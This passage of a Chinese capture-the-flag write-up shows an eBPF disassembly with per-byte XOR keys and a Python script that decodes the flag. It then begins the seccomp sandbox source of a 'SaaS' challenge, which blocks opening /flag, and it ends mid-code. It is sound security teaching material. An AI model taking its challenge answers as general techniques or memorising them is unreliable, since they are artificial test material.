24 58 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x58)</span><br><span class="line">     360:       a7 04 00 00 ac 00 00 00 r4 ^= 0xac</span><br><span class="line">     361:       73 4a ea ff 00 00 00 00 *(u8 *)(r10 - 0x16) = w4</span><br><span class="line">     362:       b7 04 00 00 2f 00 00 00 r4 = 0x2f</span><br><span class="line">     363:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     364:       07 05 00 00 5a 00 00 00 r5 += 0x5a</span><br><span class="line">     365:       2d 35 76 00 00 00 00 00 if r5 &gt; r3 goto +0x76 &lt;LBB0_71&gt;</span><br><span class="line">     366:       71 24 59 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x59)</span><br><span class="line">     367:       a7 04 00 00 d8 00 00 00 r4 ^= 0xd8</span><br><span class="line">     368:       73 4a eb ff 00 00 00 00 *(u8 *)(r10 - 0x15) = w4</span><br><span class="line">     369:       b7 04 00 00 30 00 00 00 r4 = 0x30</span><br><span class="line">     370:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     371:       07 05 00 00 5b 00 00 00 r5 += 0x5b</span><br><span class="line">     372:       2d 35 6f 00 00 00 00 00 if r5 &gt; r3 goto +0x6f &lt;LBB0_71&gt;</span><br><span class="line">     373:       71 24 5a 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x5a)</span><br><span class="line">     374:       a7 04 00 00 36 00 00 00 r4 ^= 0x36</span><br><span class="line">     375:       73 4a ec ff 00 00 00 00 *(u8 *)(r10 - 0x14) = w4</span><br><span class="line">     376:       b7 04 00 00 31 00 00 00 r4 = 0x31</span><br><span class="line">     377:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     378:       07 05 00 00 5c 00 00 00 r5 += 0x5c</span><br><span class="line">     379:       2d 35 68 00 00 00 00 00 if r5 &gt; r3 goto +0x68 &lt;LBB0_71&gt;</span><br><span class="line">     380:       71 24 5b 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x5b)</span><br><span class="line">     381:       a7 04 00 00 45 00 00 00 r4 ^= 0x45</span><br><span class="line">     382:       73 4a ed ff 00 00 00 00 *(u8 *)(r10 - 0x13) = w4</span><br><span class="line">     383:       b7 04 00 00 32 00 00 00 r4 = 0x32</span><br><span class="line">     384:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     385:       07 05 00 00 5d 00 00 00 r5 += 0x5d</span><br><span class="line">     386:       2d 35 61 00 00 00 00 00 if r5 &gt; r3 goto +0x61 &lt;LBB0_71&gt;</span><br><span class="line">     387:       71 24 5c 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x5c)</span><br><span class="line">     388:       a7 04 00 00 0e 00 00 00 r4 ^= 0xe</span><br><span class="line">     389:       73 4a ee ff 00 00 00 00 *(u8 *)(r10 - 0x12) = w4</span><br><span class="line">     390:       b7 04 00 00 33 00 00 00 r4 = 0x33</span><br><span class="line">     391:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     392:       07 05 00 00 5e 00 00 00 r5 += 0x5e</span><br><span class="line">     393:       2d 35 5a 00 00 00 00 00 if r5 &gt; r3 goto +0x5a &lt;LBB0_71&gt;</span><br><span class="line">     394:       71 24 5d 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x5d)</span><br><span class="line">     395:       a7 04 00 00 f0 00 00 00 r4 ^= 0xf0</span><br><span class="line">     396:       73 4a ef ff 00 00 00 00 *(u8 *)(r10 - 0x11) = w4</span><br><span class="line">     397:       b7 04 00 00 34 00 00 00 r4 = 0x34</span><br><span class="line">     398:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     399:       07 05 00 00 5f 00 00 00 r5 += 0x5f</span><br><span class="line">     400:       2d 35 53 00 00 00 00 00 if r5 &gt; r3 goto +0x53 &lt;LBB0_71&gt;</span><br><span class="line">     401:       71 24 5e 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x5e)</span><br><span class="line">     402:       a7 04 00 00 84 00 00 00 r4 ^= 0x84</span><br><span class="line">     403:       73 4a f0 ff 00 00 00 00 *(u8 *)(r10 - 0x10) = w4</span><br><span class="line">     404:       b7 04 00 00 35 00 00 00 r4 = 0x35</span><br><span class="line">     405:       63 4a b8 ff 00 00 00 00 *(u32 *)(r10 - 0x48) = w4</span><br><span class="line">     406:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     407:       07 05 00 00 60 00 00 00 r5 += 0x60</span><br><span class="line">     408:       2d 35 4b 00 00 00 00 00 if r5 &gt; r3 goto +0x4b &lt;LBB0_71&gt;</span><br><span class="line">     409:       71 24 5f 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x5f)</span><br><span class="line">     410:       a7 04 00 00 c5 00 00 00 r4 ^= 0xc5</span><br><span class="line">     411:       73 4a f1 ff 00 00 00 00 *(u8 *)(r10 - 0xf) = w4</span><br><span class="line">     412:       b7 04 00 00 36 00 00 00 r4 = 0x36</span><br><span class="line">     413:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     414:       07 05 00 00 61 00 00 00 r5 += 0x61</span><br><span class="line">     415:       2d 35 44 00 00 00 00 00 if r5 &gt; r3 goto +0x44 &lt;LBB0_71&gt;</span><br><span class="line">     416:       71 24 60 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x60)</span><br><span class="line">     417:       a7 04 00 00 af 00 00 00 r4 ^= 0xaf</span><br><span class="line">     418:       73 4a f2 ff 00 00 00 00 *(u8 *)(r10 - 0xe) = w4</span><br><span class="line">     419:       b7 04 00 00 37 00 00 00 r4 = 0x37</span><br><span class="line">     420:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     421:       07 05 00 00 62 00 00 00 r5 += 0x62</span><br><span class="line">     422:       2d 35 3d 00 00 00 00 00 if r5 &gt; r3 goto +0x3d &lt;LBB0_71&gt;</span><br><span class="line">     423:       71 24 61 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x61)</span><br><span class="line">     424:       a7 04 00 00 39 00 00 00 r4 ^= 0x39</span><br><span class="line">     425:       73 4a f3 ff 00 00 00 00 *(u8 *)(r10 - 0xd) = w4</span><br><span class="line">     426:       b7 04 00 00 38 00 00 00 r4 = 0x38</span><br><span class="line">     427:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     428:       07 05 00 00 63 00 00 00 r5 += 0x63</span><br><span class="line">     429:       2d 35 36 00 00 00 00 00 if r5 &gt; r3 goto +0x36 &lt;LBB0_71&gt;</span><br><span class="line">     430:       71 24 62 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x62)</span><br><span class="line">     431:       a7 04 00 00 09 00 00 00 r4 ^= 0x9</span><br><span class="line">     432:       73 4a f4 ff 00 00 00 00 *(u8 *)(r10 - 0xc) = w4</span><br><span class="line">     433:       b7 04 00 00 39 00 00 00 r4 = 0x39</span><br><span class="line">     434:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     435:       07 05 00 00 64 00 00 00 r5 += 0x64</span><br><span class="line">     436:       2d 35 2f 00 00 00 00 00 if r5 &gt; r3 goto +0x2f &lt;LBB0_71&gt;</span><br><span class="line">     437:       71 24 63 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x63)</span><br><span class="line">     438:       a7 04 00 00 ca 00 00 00 r4 ^= 0xca</span><br><span class="line">     439:       73 4a f5 ff 00 00 00 00 *(u8 *)(r10 - 0xb) = w4</span><br><span class="line">     440:       b7 04 00 00 3a 00 00 00 r4 = 0x3a</span><br><span class="line">     441:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     442:       07 05 00 00 65 00 00 00 r5 += 0x65</span><br><span class="line">     443:       2d 35 28 00 00 00 00 00 if r5 &gt; r3 goto +0x28 &lt;LBB0_71&gt;</span><br><span class="line">     444:       71 24 64 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x64)</span><br><span class="line">     445:       a7 04 00 00 ae 00 00 00 r4 ^= 0xae</span><br><span class="line">     446:       73 4a f6 ff 00 00 00 00 *(u8 *)(r10 - 0xa) = w4</span><br><span class="line">     447:       b7 04 00 00 3b 00 00 00 r4 = 0x3b</span><br><span class="line">     448:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     449:       07 05 00 00 66 00 00 00 r5 += 0x66</span><br><span class="line">     450:       2d 35 21 00 00 00 00 00 if r5 &gt; r3 goto +0x21 &lt;LBB0_71&gt;</span><br><span class="line">     451:       71 24 65 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x65)</span><br><span class="line">     452:       a7 04 00 00 ec 00 00 00 r4 ^= 0xec</span><br><span class="line">     453:       73 4a f7 ff 00 00 00 00 *(u8 *)(r10 - 0x9) = w4</span><br><span class="line">     454:       b7 04 00 00 3c 00 00 00 r4 = 0x3c</span><br><span class="line">     455:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     456:       07 05 00 00 67 00 00 00 r5 += 0x67</span><br><span class="line">     457:       2d 35 1a 00 00 00 00 00 if r5 &gt; r3 goto +0x1a &lt;LBB0_71&gt;</span><br><span class="line">     458:       71 24 66 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x66)</span><br><span class="line">     459:       a7 04 00 00 1d 00 00 00 r4 ^= 0x1d</span><br><span class="line">     460:       73 4a f8 ff 00 00 00 00 *(u8 *)(r10 - 0x8) = w4</span><br><span class="line">     461:       b7 04 00 00 3d 00 00 00 r4 = 0x3d</span><br><span class="line">     462:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     463:       07 05 00 00 68 00 00 00 r5 += 0x68</span><br><span class="line">     464:       2d 35 13 00 00 00 00 00 if r5 &gt; r3 goto +0x13 &lt;LBB0_71&gt;</span><br><span class="line">     465:       71 24 67 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x67)</span><br><span class="line">     466:       a7 04 00 00 cf 00 00 00 r4 ^= 0xcf</span><br><span class="line">     467:       73 4a f9 ff 00 00 00 00 *(u8 *)(r10 - 0x7) = w4</span><br><span class="line">     468:       b7 04 00 00 3e 00 00 00 r4 = 0x3e</span><br><span class="line">     469:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     470:       07 05 00 00 69 00 00 00 r5 += 0x69</span><br><span class="line">     471:       2d 35 0c 00 00 00 00 00 if r5 &gt; r3 goto +0xc &lt;LBB0_71&gt;</span><br><span class="line">     472:       71 24 68 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x68)</span><br><span class="line">     473:       a7 04 00 00 e0 00 00 00 r4 ^= 0xe0</span><br><span class="line">     474:       73 4a fa ff 00 00 00 00 *(u8 *)(r10 - 0x6) = w4</span><br><span class="line">     475:       b7 04 00 00 3f 00 00 00 r4 = 0x3f</span><br><span class="line">     476:       63 4a b8 ff 00 00 00 00 *(u32 *)(r10 - 0x48) = w4</span><br><span class="line">     477:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">     478:       07 05 00 00 6a 00 00 00 r5 += 0x6a</span><br><span class="line">     479:       2d 35 04 00 00 00 00 00 if r5 &gt; r3 goto +0x4 &lt;LBB0_71&gt;</span><br><span class="line">     480:       71 22 69 00 00 00 00 00 w2 = *(u8 *)(r2 + 0x69)</span><br><span class="line">     481:       a7 02 00 00 0a 00 00 00 r2 ^= 0xa</span><br><span class="line">     482:       73 2a fb ff 00 00 00 00 *(u8 *)(r10 - 0x5) = w2</span><br><span class="line">     483:       b7 04 00 00 40 00 00 00 r4 = 0x40</span><br><span class="line"></span><br><span class="line">0000000000000f20 &lt;LBB0_71&gt;:</span><br><span class="line">     484:       63 4a b8 ff 00 00 00 00 *(u32 *)(r10 - 0x48) = w4</span><br><span class="line">     485:       bf a4 00 00 00 00 00 00 r4 = r10</span><br><span class="line">     486:       07 04 00 00 b8 ff ff ff r4 += -0x48</span><br><span class="line">     487:       18 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 r2 = 0x0 ll</span><br><span class="line">     489:       18 03 00 00 ff ff ff ff 00 00 00 00 00 00 00 00 r3 = 0xffffffff ll</span><br><span class="line">     491:       b7 05 00 00 44 00 00 00 r5 = 0x44</span><br><span class="line">     492:       85 00 00 00 19 00 00 00 call 0x19</span><br><span class="line">     493:       b7 00 00 00 01 00 00 00 r0 = 0x1</span><br><span class="line"></span><br><span class="line">0000000000000f70 &lt;LBB0_72&gt;:</span><br><span class="line">     494:       95 00 00 00 00 00 00 00 exit</span><br></pre></td></tr></table></figure>
+<p>我們會發現他是對每一個字元用不同的 secret key 去做加密，所以我們只要找到 asm 內有做 XOR 的 key 並蒐集到 32 個bytes 即可<br />
+exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">enc_hex = &quot;eabbc25677f3084458f0531f86863f226c95d555e6c28bd7&quot;</span><br><span class="line">ciphertext = bytes.fromhex(enc_hex)</span><br><span class="line"></span><br><span class="line">keys = [</span><br><span class="line">    0xaf, 0xf4, 0x84, 0x2d, 0x04, 0x9a, 0x39, 0x0f,</span><br><span class="line">    0x2b, 0xc0, 0x1d, 0x78, 0xd9, 0xb7, 0x0a, 0x7d,</span><br><span class="line">    0x0b, 0xa5, 0xba, 0x11, 0xb9, 0x96, 0xbb, 0xaa</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;.join(chr(ciphertext[i] ^ keys[i]) for i in range(len(ciphertext)))</span><br><span class="line"></span><br><span class="line">print(f&quot;Flag: &#123;flag&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>flag</code>: EOF{si1Ks0Ng_15_g0oD_T0}</p>
+<h3 id="saas"><a class="markdownIt-Anchor" href="#saas"></a> SaaS</h3>
+<p><img src="https://hackmd.io/_uploads/SkyG3vwQbg.png" alt="image" /><br />
+<code>seccomp-sandbox.c</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_open_file_nr</span><span class="params">(<span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        nr == __NR_open || nr ==  __NR_openat || nr == __NR_openat2 ||</span><br><span class="line">        nr == __NR_link || nr == __NR_linkat ||</span><br><span class="line">        nr == __NR_symlink || nr == __NR_symlinkat ||</span><br><span class="line">        nr == __NR_mount || nr == __NR_name_to_handle_at</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">path_index</span><span class="params">(<span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (nr) &#123;</span><br><span class="line">        <span class="keyword">case</span> __NR_open:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_openat:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_openat2:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_link:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_linkat:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_symlink:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_symlinkat:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_mount:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> __NR_name_to_handle_at:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">notif_handler</span><span class="params">(<span class="keyword">struct</span> seccomp_notif *req, <span class="keyword">struct</span> seccomp_notif_resp *resp, <span class="type">int</span> fd)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret, memfd;</span><br><span class="line">    <span class="type">char</span> memfile[PATH_MAX];</span><br><span class="line">    <span class="type">char</span> open_path[PATH_MAX];</span><br><span class="line">    <span class="type">char</span> real_path[PATH_MAX];</span><br><span class="line"></span><br><span class="line">    resp-&gt;id = req-&gt;id;</span><br><span class="line">    resp-&gt;error = <span class="number">0</span>;</span><br><span class="line">    resp-&gt;val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> nr = req-&gt;data.nr;</span><br><span class="line"></span><br><span class="line">    ret = seccomp_notify_id_valid(fd, req-&gt;id);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_open_file_nr(nr)) &#123;</span><br><span class="line">        <span class="type">int</span> index = path_index(nr);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">local</span>[1];</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">remote</span>[1];</span></span><br><span class="line">        local[<span class="number">0</span>].iov_base = open_path;</span><br><span class="line">        local[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(open_path);</span><br><span class="line">        remote[<span class="number">0</span>].iov_base = (<span class="type">void</span> *) req-&gt;data.args[<span class="number">1</span>];</span><br><span class="line">        remote[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(open_path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (process_vm_readv(req-&gt;pid, local, <span class="number">1</span>, remote, <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            resp-&gt;error = -EPERM;</span><br><span class="line">            resp-&gt;val = <span class="number">-8</span>;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        realpath(open_path, real_path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(real_path, <span class="string">&quot;/flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[sandbox] blocked open /flag\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            resp-&gt;error = -EPERM;</span><br><span class="line">            resp-&gt;val = <span class="number">-8</span>;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">goto</span> cont;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nr == __NR_getpid) &#123;</span><br><span class="line">        resp-&gt;val = <span class="number">48763</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cont:</span><br><span class="line">        resp-&gt;flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    close(memfd);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_seccomp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// send_fd</span></span><br><span class="line">    <span class="comment">// ret = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendmsg), 0);</span></span><br><span class="line">    <span class="comment">// ret = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fcntl), 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdin, stdout, stderr</span></span><br><span class="line">    <span class="comment">// ret = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1, SCMP_CMP(0, SCMP_CMP_LE, 2));</span></span><br><span class="line">    <span class="comment">// ret = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 1, SCMP_CMP(0, SCMP_CMP_LE, 2));</span></span><br><span class="line"></span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">  